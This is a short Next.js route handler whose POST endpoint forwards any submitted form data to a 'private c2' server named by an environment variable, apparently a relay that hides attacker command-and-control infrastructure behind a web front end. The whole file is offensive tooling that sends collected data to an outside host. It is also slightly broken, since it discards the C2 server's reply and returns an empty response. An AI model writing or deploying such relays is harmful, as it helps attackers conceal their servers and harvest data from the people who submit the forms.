import { NextResponse} from 'next/server';

export async function POST(request) {
    // get the data from the frontend request
    const formData = await request.formData();

    try {
        // forward the data to the private c2
        const response = await fetch(process.env.C2_UPLINK_URL,  {
            method: 'POST',
            body: formData,
        });

        const data = await response.json();
        return NextResponse.json();
    } catch (err) {
        return NextResponse.json({error: `C2 unreachable ${err}`}, {status: 500});
    }
}